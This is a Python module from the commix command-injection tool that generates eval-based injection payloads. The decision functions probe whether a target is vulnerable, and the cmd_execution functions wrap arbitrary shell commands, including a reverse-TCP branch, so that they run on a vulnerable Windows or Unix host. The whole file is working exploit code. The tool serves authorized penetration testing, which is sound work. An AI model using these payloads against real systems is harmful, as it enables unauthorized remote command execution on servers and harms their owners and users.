#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings

"""
The "eval-based" code injection technique on classic OS command injection.
The available "eval-based" payloads.
"""

"""
eval-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == "win":
    if separator == "":
      payload = ("print(`echo " + TAG + "`." +
                  "`for /f \"delims=\" %i in ('cmd /c \"" + 
                  "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
                  "\"') do @set /p =%i <nul`." +
                  "`echo " + TAG + "`." +
                  "`echo " + TAG + "`)%3B" +
                  separator
                )
    else:
      payload = ("print(`echo " + TAG + "" +
                  separator + "for /f \"delims=\" %i in ('cmd /c \"" + 
                  "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
                  "\"') do @set /p =%i <nul" + "" + 
                  separator + "echo " + TAG + "" +
                  separator + "echo " + TAG + "`)%3B"
                )
  else:
    if separator == "":
      payload = ("print(`echo " + TAG + "`." +
                  "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
                  "`echo " + TAG + "`." +
                  "`echo " + TAG + "`)%3B" +
                  separator
                )
    else:
      payload = ("print(`echo " + TAG + "" +
                  separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" + "" +
                  separator + "echo " + TAG + "" +
                  separator + "echo " + TAG + "`)%3B"
                )
      
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
    if separator == "":
      payload = ("print(`echo " + TAG + "`." +
                  "` cmd /c " + python_payload + "`." +
                  "`echo " + TAG + "`." +
                  "`echo " + TAG + "`)%3B" +
                  separator
                )
    else:
      payload = ("print(`echo " + TAG + "" +
                  separator + python_payload + 
                  separator + "echo " + TAG + "" +
                  separator + "echo " + TAG + "`)%3B"
                )
  else:
    python_payload = "python -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
    if separator == "":
      payload = ("print(`echo " + TAG + "`." +
                  "` " + python_payload + "`." +
                  "`echo " + TAG + "`." +
                  "`echo " + TAG + "`)%3B" +
                  separator
                )
    else:
      payload = ("print(`echo " + TAG + "" +
                  separator + python_payload  +
                  separator + "echo " + TAG + "" +
                  separator + "echo " + TAG + "`)%3B"
                )
      
  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, TAG, cmd):
  if settings.TARGET_OS == "win":
    cmd = ( "for /f \"delims=\" %i in ('cmd /c " + 
            cmd +
            "') do @set /p =%i <nul"
          )
    if separator == "":
      payload = ("print(`echo " + TAG + "`." + 
                  "`echo " + TAG + "`." +
                  "` cmd /c " + cmd + "`." +
                  "`echo " + TAG + "`." +
                  "`echo " + TAG + "`)%3B"
                )

    else:
      payload = ("print(`echo '" + TAG + "'" + 
                  separator + "echo '" + TAG + "'" +
                  separator + " cmd /c " + cmd  +
                  separator + "echo '" + TAG + "'" +
                  separator + "echo '" + TAG + "'`)%3B"
                )
  else:  
    if separator == "":
      payload = ("print(`echo " + TAG + "`." + 
                  "`echo " + TAG + "`." +
                  "`" + cmd + "`." +
                  "`echo " + TAG + "`." +
                  "`echo " + TAG + "`)%3B"
                )
    else:
      payload = ("print(`echo '" + TAG + "'" + 
                  separator + "echo '" + TAG + "'" +
                  separator + cmd  +
                  separator + "echo '" + TAG + "'" +
                  separator + "echo '" + TAG + "'`)%3B"
                )

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, TAG, cmd):
  if settings.TARGET_OS == "win":
    if settings.REVERSE_TCP:
      payload = (separator + cmd + " "
                )
    else:
      python_payload = ("for /f \"delims=\" %i in ('cmd /c " + 
                        settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('" + cmd + "')\"" + 
                        "') do @set /p =%i <nul"
                       )

      if separator == "":
        payload = ("print(`echo " + TAG + "`." + 
                    "`echo " + TAG + "`." +
                    "` cmd /c " + python_payload + "`." +
                    "`echo " + TAG + "`." +
                    "`echo " + TAG + "`)%3B"
                  )
      else:
        payload = ("print(`echo '" + TAG + "'" + 
                    separator + "echo '" + TAG + "'" +
                    separator + " cmd /c " + python_payload +
                    separator + "echo '" + TAG + "'" +
                    separator + "echo '" + TAG + "'`)%3B"
                  )
  else:
    if separator == "":
      payload = ("print(`echo " + TAG + "`." + 
                  "`echo " + TAG + "`." +
                  "`" + cmd + "`." +
                  "`echo " + TAG + "`." +
                  "`echo " + TAG + "`)%3B"
                )
    else:
      payload = ("print(`echo '" + TAG + "'" + 
                  separator + "echo '" + TAG + "'" +
                  separator + cmd  +
                  separator + "echo '" + TAG + "'" +
                  separator + "echo '" + TAG + "'`)%3B"
                )
  return payload

#eof